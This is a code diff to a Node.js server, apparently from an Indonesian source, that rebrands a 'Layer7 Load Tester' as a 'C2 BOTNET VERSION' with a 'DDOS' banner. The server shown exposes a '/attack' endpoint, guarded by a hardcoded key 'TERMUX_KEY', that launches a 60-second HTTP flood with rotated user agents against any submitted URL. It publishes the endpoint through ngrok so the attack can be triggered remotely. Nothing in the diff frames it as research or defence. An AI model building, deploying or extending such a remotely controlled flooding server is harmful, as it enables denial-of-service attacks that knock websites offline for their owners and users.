@@ -13,14 +13,18 @@ let currentPort = Math.floor(Math.random() * (60000 - 3000 + 1)) + 3000;
 
 const showBanner = () => {
   console.log(`
-  ░██████╗░██╗░░░░░░█████╗░██████╗░███████╗  ██╗░░██╗███████╗
-  ██╔════╝░██║░░░░░██╔══██╗██╔══██╗██╔════╝  ██║░██╔╝██╔════╝
-  ██║░░██╗░██║░░░░░██║░░██║██████╔╝█████╗░░  █████═╝░█████╗░░
-  ██║░░╚██╗██║░░░░░██║░░██║██╔══██╗██╔══╝░░  ██╔═██╗░██╔══╝░░
-  ╚██████╔╝███████╗╚█████╔╝██║░░██║███████╗  ██║░╚██╗███████╗
-  ░╚═════╝░╚══════╝░╚════╝░╚═╝░░╚═╝╚══════╝  ╚═╝░░╚═╝╚══════╝
+  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣠⣤⣤⣀⡠
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣧
+⠀⠀⠀⠀⠀⠀⠈⠀⠄⠀⣀⣤⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+⠀⠀⠀⠀⠀⠀⠀⢀⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠈ [ # ] Dizflyze
+⠀⠀⠀⠀⢀⣁⢾⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⢋⣭⡍⣿⣿⣿⣿⣿⣿⠐ [ # ] DDOS
+⠀⢀⣴⣶⣶⣝⢷⡝⢿⣿⣿⣿⠿⠛⠉⠀⠂⣰⣿⣿⢣⣿⣿⣿⣿⣿⣿⡇ [ # ] 3.1.8
+⢀⣾⣿⣿⣿⣿⣧⠻⡌⠿⠋⠡⠁⠈⠀⠀⢰⣿⣿⡏⣸⣿⣿⣿⣿⣿⣿⣿ [ # ] 26-MEI
+⣼⣿⣿⣿⣿⣿⣿⡇⠁⠀⠀⠐⠀⠀⠀⠀⠈⠻⢿⠇⢻⣿⣿⣿⣿⣿⣿⡟
+⠙⢹⣿⣿⣿⠿⠋⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⢿⣿⣿⡿⠟⠁
+⠀⠀⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
   `.cyan);
-  console.log(`  Layer7 Load Tester Elite v3.0 - CloudShell Server\n`.yellow);
+  console.log(`  C2 BOTNET VERSION\n`.yellow);
 };
 
 const startNgrok = async () => {
@@ -32,11 +36,11 @@ const startNgrok = async () => {
       region: 'ap'
     });
     
-    console.log(`\n${'»'.green} ${'API TERMUX:'.bold} ${url.underline}`);
-    console.log(`${'»'.blue} ${'Status:'.bold} ${'Menunggu koneksi...'.yellow}\n`);
+    console.log(`\n${'»'.green} ${'[ API C2 ] :'.bold} ${url.underline}`);
+    console.log(`${'»'.blue} ${'Status:'.bold} ${'[ INFO ] : [ MENUNGGU ]'.yellow}\n`);
     return url;
   } catch (e) {
-    console.log(`\n${'×'.red} ${'Gagal memulai Ngrok:'.bold} ${e.message}`);
+    console.log(`\n${'×'.red} ${'[ NGROK ERROR ] :'.bold} ${e.message}`);
     process.exit(1);
   }
 };
@@ -49,8 +53,8 @@ const attackTarget = async (target, duration) => {
     'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X)'
   ];
 
-  console.log(`\n${'⚡'.yellow} ${'Memulai serangan ke:'.bold} ${target.underline}`);
-  console.log(`${'⏳'.cyan} ${'Durasi:'.bold} ${duration.toString().yellow} detik\n`);
+  console.log(`\n${'⚡'.yellow} ${'[ ATTACK ] :'.bold} ${target.underline}`);
+  console.log(`${'⏳'.cyan} ${'[ DURASI ]:'.bold} ${duration.toString().yellow} detik\n`);
 
   const attackPromises = [];
   const startTime = Date.now();
@@ -77,11 +81,11 @@ const attackTarget = async (target, duration) => {
   }
 
   await Promise.all(attackPromises);
-  console.log(`\n${'✓'.green} ${'Serangan selesai!'.bold} Cek Termux untuk hasil lengkap\n`);
+  console.log(`\n${'✓'.green} ${'[ SUCCESS ]'.bold}\n`);
 };
 
 app.post('/attack', async (req, res) => {
-  if (attackActive) return res.status(429).json({ error: 'Serangan sedang berjalan' });
+  if (attackActive) return res.status(429).json({ error: '[ PROSES ]' });
   
   const { target, apiKey } = req.body;
   if (apiKey !== 'TERMUX_KEY') return res.status(403).json({ error: 'Akses tidak valid' });
@@ -90,9 +94,9 @@ app.post('/attack', async (req, res) => {
     new URL(target);
     attackActive = true;
     attackTarget(target, 60);
-    res.status(200).json({ status: 'Serangan dimulai', target });
+    res.status(200).json({ status: '[ START ]', target });
   } catch (e) {
-    res.status(400).json({ error: 'Format URL tidak valid' });
+    res.status(400).json({ error: '[ URL INVALID! ]' });
   }
 });
 
@@ -107,6 +111,6 @@ app.get('/info', async (req, res) => {
 
 showBanner();
 app.listen(currentPort, () => {
-  console.log(`${'»'.cyan} ${'Server berjalan di port:'.bold} ${currentPort.toString().yellow}`);
+  console.log(`${'»'.cyan} ${'[ RUNING ] :'.bold} ${currentPort.toString().yellow}`);
   startNgrok();
 });
